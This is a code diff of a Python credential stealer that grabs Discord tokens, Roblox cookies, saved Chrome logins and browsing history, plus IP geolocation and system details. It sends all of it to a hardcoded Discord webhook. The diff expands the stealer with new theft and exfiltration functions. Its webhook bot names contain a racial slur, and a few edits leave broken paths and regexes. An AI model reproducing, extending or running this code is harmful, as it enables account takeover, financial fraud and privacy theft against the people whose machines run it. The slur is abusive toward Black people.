@@ -1,5 +1,3 @@
-import random
-import string
 import os
 import subprocess
 import sys
@@ -14,6 +12,7 @@ import requests
 import tempfile
 import platform
 import psutil
+import cpuinfo
 import GPUtil
 import socket
 import getpass
@@ -21,9 +20,9 @@ import threading
 import time
 import keyboard
 import ctypes
-import win32crypt
-from Crypto.Cipher import AES
 from pynput import mouse, keyboard as pynput_keyboard
+from Crypto.Cipher import AES
+import win32crypt
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1435400854764130335/FjKkrLaNQ0uUt1N6Ud4cPmLmKXknSxaw_-H_b-qHuPG_bheA1l6nxdddvLatlBioO06Q"
 
@@ -47,7 +46,7 @@ PATHS = {
     'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
     'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
     'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
-    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
+    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
     'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
     'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
     'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
@@ -79,7 +78,7 @@ def gettokens(path):
         try:
             with open(f"{path}{file}", "r", errors="ignore") as f:
                 for line in (x.strip() for x in f.readlines()):
-                    for values in re.findall(r"dQw4w9WgXcQ:[^.*]*$", line):
+                    for values in re.findall(r"dQw4w9WgXcQ:[^.*$'(.*)'$.*$][^\"]*", line):
                         tokens.append(values)
         except PermissionError:
             continue
@@ -99,36 +98,6 @@ def getipwhois_data():
             return json.loads(response.read().decode())
     except Exception as e:
         return {"error": str(e)}
-
-def retrieve_roblox_cookies():
-    user_profile = os.getenv("USERPROFILE", "")
-    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
-
-    temp_dir = os.getenv("TEMP", "")
-    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
-    shutil.copy(roblox_cookies_path, destination_path)
-
-    try:
-        with open(destination_path, 'r', encoding='utf-8') as file:
-            file_content = json.load(file)
-
-        encoded_cookies = file_content.get("CookiesData", "")
-
-        decoded_cookies = base64.b64decode(encoded_cookies)
-        decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
-        decrypted_text = decrypted_cookies.decode('utf-8', errors='ignore')
-
-        return decrypted_text
-    except Exception as e:
-        return f"Error retrieving Roblox cookies: {e}"
-
-def send_to_discord(message):
-    payload = {"content": message}
-    response = requests.post(WEBHOOK_URL, json=payload)
-    if response.status_code == 204:
-        print("Message sent successfully!")
-    else:
-        print(f"Failed to send message: {response.status_code} {response.text}")
 
 def main():
     checked = []
@@ -170,7 +139,7 @@ def main():
                         res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
                         vanity = ""
 
-                        if res["vanity_url_code"] is not None:
+                        if res["vanity_url_code"] != None:
                             vanity = f"""; .gg/{res["vanity_url_code"]}"""
 
                         guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
@@ -183,21 +152,19 @@ def main():
                 exp_date = None
                 if has_nitro:
                     badges += f":BadgeSubscriber: "
-                    if res[0]["current_period_end"] is not None:
-                        exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
+                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
 
                 res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
                 available = 0
                 print_boost = ""
                 boost = False
                 for id in res:
-                    if id["cooldown_ends_at"] is not None:
-                        cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
-                        if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
-                            print_boost += f"ㅤ- Available now\n"
-                            available += 1
-                        else:
-                            print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
+                    cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
+                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
+                        print_boost += f"ㅤ- Available now\n"
+                        available += 1
+                    else:
+                        print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
                     boost = True
                 if boost:
                     badges += f":BadgeBoost: "
@@ -226,7 +193,8 @@ def main():
                         {
                             'title': f"**New user data: {res_json['username']}**",
                             'description': f"""
-                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}IP Info:```yaml\nIP: {ip_data.get("ip")}\nMore details: https://ipwho.is/{ip_data.get("ip")}```System Info:```yaml\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
+                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {ip_data.get("ip")} | Type: {ip_data.get("type")} | Continent: {ip_data.get("continent")} ({ip_data.get("continent_code")}) | Country: {ip_data.get("country")} ({ip_data.get("country_code")}) | Region: {ip_data.get("region")} ({ip_data.get("region_code")}) | City: {ip_data.get("city")} | Postal: {ip_data.get("postal")} | Lat: {ip_data.get("latitude")} | Lon: {ip_data.get("longitude")} | EU: {ip_data.get("is_eu")} | Calling Code: {ip_data.get("calling_code")} | Capital: {ip_data.get("capital")} | Borders: {ip_data.get("borders")} | ASN: {ip_data.get("asn")} | Org: {ip_data.get("org")} | ISP: {ip_data.get("isp")} | Timezone: {ip_data.get("timezone")} | UTC Offset: {ip_data.get("timezone_offset")} | Currency: {ip_data.get("currency")} | Flag: {ip_data.get("flag")} | Emoji: {ip_data.get("emoji")}
+\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
                             'color': 3092790,
                             'footer': {
                                 'text': "Made by Ryzen"
@@ -236,7 +204,8 @@ def main():
                             }
                         }
                     ],
-                    "username": "Nigga Logger",
+                    "username": "Cold Nigga",
+                    "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
                 }
 
                 urllib.request.urlopen(urllib.request.Request(WEBHOOK_URL, data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
@@ -246,8 +215,184 @@ def main():
                 print(f"ERROR: {e}")
                 continue
 
-    roblox_cookies = retrieve_roblox_cookies()
-    send_to_discord(f"Decrypted Roblox Cookies:\n```\n{roblox_cookies}\n```")
+def send_to_discord(message):
+    payload = {"content": message}
+    response = requests.post(WEBHOOK_URL, json=payload)
+    if response.status_code == 204:
+        print("")
+    else:
+        print("")
 
+def retrieve_roblox_cookies():
+    user_profile = os.getenv("USERPROFILE", "")
+    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
+
+    if not os.path.exists(roblox_cookies_path):
+        send_to_discord("⚠️ robloxcookies.dat not found.")
+        return
+
+    temp_dir = os.getenv("TEMP", "")
+    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
+    shutil.copy(roblox_cookies_path, destination_path)
+
+    try:
+        with open(destination_path, 'r', encoding='utf-8') as file:
+            file_content = json.load(file)
+
+        encoded_cookies = file_content.get("CookiesData", "")
+        if not encoded_cookies:
+            send_to_discord("⚠️ No 'CookiesData' found in the file.")
+            return
+
+        decoded_cookies = base64.b64decode(encoded_cookies)
+        decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
+        decrypted_text = decrypted_cookies.decode('utf-8', errors='ignore')
+
+        send_to_discord(f"Decrypted Roblox Cookies:\n```\n{decrypted_text}\n```")
+
+    except json.JSONDecodeError as e:
+        send_to_discord(f"❌ JSON parsing error: {e}")
+    except Exception as e:
+        send_to_discord(f"❌ Unexpected error: {e}")
+
+def get_login_data_path():
+    try:
+        user_profile = os.environ['USERPROFILE']
+        base_path = os.path.join(user_profile, r"AppData\Local\Google\Chrome\User Data")
+        for profile in ["Default", "Profile 1", "Profile 2"]:
+            candidate = os.path.join(base_path, profile, "Login Data")
+            if os.path.exists(candidate):
+                return candidate
+    except:
+        pass
+    return None
+
+def copy_database(source_path, temp_path):
+    try:
+        shutil.copy2(source_path, temp_path)
+        return True
+    except:
+        return False
+
+def extract_logins(db_path):
+    results = []
+    try:
+        con = sqlite3.connect(db_path)
+        cur = con.cursor()
+        cur.execute("SELECT origin_url, username_value, date_created FROM logins")
+        rows = cur.fetchall()
+        con.close()
+
+        for url, username, timestamp in rows:
+            if not username.strip():
+                continue
+            try:
+                dt = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=timestamp)
+                iso_time = dt.isoformat()
+            except:
+                iso_time = "Unknown"
+            results.append((url, username, iso_time))
+    except:
+        pass
+    return results
+
+def write_to_file(data, file_path):
+    try:
+        with open(file_path, 'w', encoding='utf-8') as f:
+            for url, email, timestamp in data:
+                f.write(f"URL: {url}\nEmail: {email}\nSaved: {timestamp}\n\n")
+    except:
+        pass
+
+def send_file_to_discord(file_path):
+    try:
+        with open(file_path, 'rb') as f:
+            files = {
+                'file': (os.path.basename(file_path), f)
+            }
+            requests.post(WEBHOOK_URL, files=files)
+    except:
+        pass
+
+def collect_chrome_logins():
+    try:
+        original_db = get_login_data_path()
+        if not original_db:
+            return
+
+        temp_db = os.path.join(os.environ['TEMP'], "LoginData_Copy.db")
+        if not copy_database(original_db, temp_db):
+            return
+
+        logins = extract_logins(temp_db)
+        if not logins:
+            return
+
+        temp_txt = os.path.join(os.environ['TEMP'], "chrome_logins.txt")
+        write_to_file(logins, temp_txt)
+        send_file_to_discord(temp_txt)
+    except:
+        pass
+
+def get_size(bytes, suffix="B"):
+    factor = 1024
+    for unit in ["", "K", "M", "G", "T"]:
+        if bytes < factor:
+            return f"{bytes:.2f} {unit}{suffix}"
+        bytes /= factor
+
+def get_user_email():
+    try:
+        result = subprocess.run(
+            ["powershell", "-Command", "(Get-CimInstance -ClassName Win32_UserAccount | Where-Object {$_.LocalAccount -eq $false}).Name"],
+            capture_output=True, text=True
+        )
+        email = result.stdout.strip()
+        return email if email else "No Microsoft account email found"
+    except Exception as e:
+        return f"Error: {e}"
+
+def get_chrome_history(limit=100):
+    original_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
+    temp_path = os.path.join(tempfile.gettempdir(), "chrome_history_copy")
+
+    try:
+        shutil.copy2(original_path, temp_path)
+        conn = sqlite3.connect(temp_path)
+        cursor = conn.cursor()
+
+        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,))
+        rows = cursor.fetchall()
+
+        history_lines = []
+        for url, title, timestamp in rows:
+            visit_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=timestamp)
+            history_lines.append(f"{visit_time.strftime('%Y-%m-%d %H:%M:%S')} - {title} ({url})")
+
+        conn.close()
+        os.remove(temp_path)
+        return "\n".join(history_lines)
+
+    except Exception as e:
+        return f"Error accessing Chrome history: {e}"
+
+def send_history_to_discord(history_text):
+    with tempfile.NamedTemporaryFile("w+", delete=False, suffix=".txt", encoding="utf-8") as temp_file:
+        temp_file.write(history_text)
+        temp_file_path = temp_file.name
+
+    with open(temp_file_path, "rb") as f:
+        files = {"file": (os.path.basename(temp_file_path), f)}
+        response = requests.post(WEBHOOK_URL, files=files)
+
+    os.remove(temp_file_path)
+    return response.status_code
+
+# --- Run ---
 if __name__ == "__main__":
     main()
+    retrieve_roblox_cookies()
+    collect_chrome_logins()
+    
+    history = get_chrome_history(limit=200)
+    status = send_history_to_discord(history)
